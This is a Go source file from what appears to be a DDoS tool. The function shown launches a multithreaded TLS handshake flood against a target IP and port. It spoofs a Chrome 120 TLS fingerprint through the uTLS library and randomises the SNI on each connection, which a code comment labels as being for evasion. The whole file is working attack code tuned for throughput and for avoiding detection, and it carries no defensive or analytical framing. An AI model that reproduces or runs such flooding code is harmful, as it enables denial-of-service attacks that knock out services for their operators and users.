package main

import (
	"context"
	"fmt"
	"net"
	"runtime"
	"sync"
	mrand "math/rand"
	"time"

	utls "github.com/refraction-networking/utls"
)

func startTlsHandshakeFlood(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration, pps int) {
	fmt.Printf("[TLS-HAND] Handshake Flood on %s:%d | threads=%d | dur=%v | max_pps=%d\n",
		targetIP, targetPort, threads, duration, pps)

	targetAddr := net.JoinHostPort(targetIP, fmt.Sprintf("%d", targetPort))
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in TLS-Hand: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := mrand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := mrand.New(src)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}
				}

				dialer := &net.Dialer{
					Timeout: 5 * time.Second,
				}
				conn, err := dialer.Dial("tcp", targetAddr)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}

				// uTLS Chrome 120 optimization
				uConn := utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloChrome_120)
				
				// Randomized SNI for evasion
				sni := fmt.Sprintf("%x.com", localRand.Uint64())
				uConn.SetSNI(sni)

				err = uConn.Handshake()
				if err == nil {
					AddStats(1, 1024) 
				}
				
				uConn.Close()
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Println("[TLS-HAND] TLS Handshake Flood finished")
}
